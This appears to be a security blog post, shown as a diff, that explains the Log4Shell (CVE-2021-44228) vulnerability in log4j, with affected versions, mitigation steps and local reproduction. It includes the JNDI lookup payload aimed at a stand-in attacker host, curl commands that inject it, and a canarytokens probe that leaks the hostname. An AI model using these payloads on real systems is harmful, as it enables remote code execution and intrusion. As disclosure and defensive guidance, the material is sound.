@@ -1,0 +1,147 @@
+
+On Thursday, December 9th a 0-day exploit in the popular Java logging library log4j (version 2), called Log4Shell, was discovered that results in Remote Code Execution (RCE) simply by logging a certain string.
+
+Given how ubiquitous this library is, the severity of the exploit (full server control), and how easy it is to exploit, the impact of this vulnerability is quite severe.
+
+The 0-day was tweeted along with a POC posted on GitHub. While we had initially given it the name "Log4Shell", the vulnerability has now been published as CVE-2021-44228 on NVD.
+
+This post provides resources to help you understand the vulnerability and how to mitigate it.
+
+This blog post is also available at https://log4shell.com/
+
+Claim your free Log4Shell scan
+If you're concerned that you may be impacted by Log4Shell, you can quickly run a free scan against your code by installing LunaTrace on GitHub or by downloading our scanning CLI tool from GitHub.
+
+We're the experts that wrote those tools and, since we first wrote this post in December of 2021, we've successfully gone on to help thousands of companies, from startups to Fortune 500 companies, fix vulnerabilities like Log4Shell and Spring4Shell across their entire software stack.
+
+Who is impacted?
+Many, many services are vulnerable to this exploit. Cloud services like Steam, Apple iCloud, as well as apps like Minecraft, have already been found to be vulnerable.
+
+An extensive list of responses from impacted organizations has been compiled here.
+
+Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like the 2017 Equifax data breach.
+
+Many Open Source projects like the Minecraft server, Paper, have already begun patching their usage of log4j2.
+
+Simply changing an iPhone's name has been shown to trigger the vulnerability in Apple's servers.
+
+Updates (3 hours after posting): According to this blog post (see translation), JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1 are not affected by the LDAP attack vector. In these versions com.sun.jndi.ldap.object.trustURLCodebase is set to false meaning JNDI cannot load remote code using LDAP, except in very specific cases. However, there are other attack vectors targeting this vulnerability which can result in RCE. An attacker could still leverage existing code on the server to execute a payload. An attack targeting the class org.apache.naming.factory.BeanFactory, present on Apache Tomcat servers, is discussed in this blog post. Also, there are some specific configurations where a remote JNDI fetch could still take place, as described in this post. Please update to the latest version of log4j for a more complete solution.
+
+Log4Shell Migitation Guide
+To quickly determine if you're impacted by Log4Shell you can check for free by installing LunaTrace on GitHub Marketplace which scan your code and generate a report.
+
+For other scanning strategies to detect Log4Shell, please visit our Dedicated Log4Shell Migitation Guide with more resources.
+
+Affected Apache log4j Versions
+log4j v2
+Almost all versions of log4j version 2 are affected.
+
+2.0-beta9 <= Apache log4j <= 2.14.1
+
+LIMITED VULNERABILITIES FOUND IN 2.15.0 AND 2.16.0
+As of Tuesday, Dec 14, version 2.15.0 was found to still have a possible vulnerability in some apps. And, a few days later, a DOS vulnerability was found in 2.16.0 too.
+
+We recommend updating to 2.16.0 which disables JNDI and completely removes %m{lookups}. (Updated: See below)
+
+We recommend updating to 2.17.0 which includes the fixes introduced in 2.16.0 as well as a fix for a discovered denial of service (DOS) attack.
+
+log4j v1
+Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it, you need to migrate to 2.17.0.
+
+Permanent Mitigation
+For Current Information: We have written a comprehensive guide on log4j mitigation strategies.
+
+Version 2.17.0 of log4j has been released without the RCE or DOS vulnerabilities. log4j-core.jar is available on Maven Central here, with [release notes] and [log4j security announcements].
+
+The release can also be downloaded from the Apache Log4j Download page.
+
+Temporary Mitigation
+For Current Information: Please read our follow-up guide on log4j mitigation strategies.
+
+formatMsgNoLookups DOES NOT PROTECT AGAINST ALL ATTACKS
+As of Tuesday, Dec 14, it's been found that this flag is ineffective at stopping certain attacks, which is partially explained in CVE-2021-45046.
+You must update to 2.17.0, or use the JNDI patches for temporary mitigation explained in our mitigation guide.
+
+As per this discussion on HackerNews:
+
+The 'formatMsgNoLookups' property was added in version 2.10.0, per the JIRA Issue LOG4J2-2109 [1] that proposed it. Therefore the 'formatMsgNoLookups=true' mitigation strategy is available in version 2.10.0 and higher, but is no longer necessary with version 2.15.0, because it then becomes the default behavior [2][3].
+
+If you are using a version older than 2.10.0 and cannot upgrade, your mitigation choices are:
+
+Modify every logging pattern layout to say %m{nolookups} instead of %m in your logging config files. See details at https://issues.apache.org/jira/browse/LOG4J2-2109 This only works on versions >= 2.7. This is a bad strategy which will likely result in a vulnerability long-term.
+
+Substitute a non-vulnerable or empty implementation of the class org.apache.logging.log4j.core.lookup.JndiLookup, in a way that your classloader uses your replacement instead of the vulnerable version of the class. Refer to your application or stack's classloading documentation to understand this behavior.
+
+How the exploit works
+Exploit Requirements
+A server with a vulnerable log4j version (listed above).
+An endpoint with any protocol (HTTP, TCP, etc), that allows an attacker to send the exploit string.
+A log statement that logs out the string from that request.
+Example Vulnerable Code
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+import java.io.*;
+import java.sql.SQLException;
+import java.util.*;
+
+public class VulnerableLog4jExampleHandler implements HttpHandler {
+
+  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
+
+  /**
+   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
+   * This is pseudo-code to explain the vulnerability, and not a full example.
+   * @param he HTTP Request Object
+   */
+  public void handle(HttpExchange he) throws IOException {
+    String apiVersion = he.getRequestHeader("X-Api-Version");
+
+    // This line triggers the RCE by logging the attacker-controlled HTTP header.
+    // The attacker can set their X-Api-Version header to: ${jndi:ldap://some-attacker.com/a}
+    log.info("Requested Api Version:{}", apiVersion);
+
+    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
+}
+
+
+Reproducing Locally
+If you want to reproduce this vulnerability locally, you can refer to christophetd's vulnerable app.
+
+In a terminal run:
+
+docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+
+And in another:
+
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
+
+The logs should include an error message indicating that a remote lookup was attempted but failed:
+
+2021-12-10 17:14:56,207 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1/a]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
+
+
+Exploit Steps
+Data from the User gets sent to the server (via any protocol).
+logs the data containing the malicious payload from the request ${jndi:ldap://some-attacker.com/a}, where some-attacker.com is an attacker controlled server.
+The log4j vulnerability is triggered by this payload and the server makes a request to some-attacker.com via "Java Naming and Directory Interface" (JNDI).
+This response contains a path to a remote Java class file (ex. http://second-stage.some-attacker.com/Exploit.class), which is injected into the server process.
+This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
+Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit them. The marshalsec project is one of many that demonstrates generating an exploit payload that could be used for this vulnerability. You can refer to this malicious LDAP server for an example of exploitation.
+
+How to identify vulnerable remote servers
+MAKE SURE THAT YOU HAVE PERMISSION FROM THE OWNER OF THE SERVER BEING PENETRATION TESTED.
+The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above, the exploit will cause the vulnerable server to attempt to fetch some remote code. By using the address of a free online DNS logging tool in the exploit string, we can detect when the vulnerability is triggered.
+
+CanaryTokens.org is an Open Source web app for this purpose that even generates the exploit string automatically and sends an email notification when the DNS is queried. Select Log4Shell from the drop-down menu. Then, embed the string in a request field that you expect the server to log. This could be in anything from a form input to an HTTP header. In our example above, the X-Api-Version header was being logged. This request should trigger it:
+
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
+
+
+THESE REQUESTS MAY NOT BE PRIVATE
+If you wish to test more discretely, you may setup your own authoritative DNS server for testing.
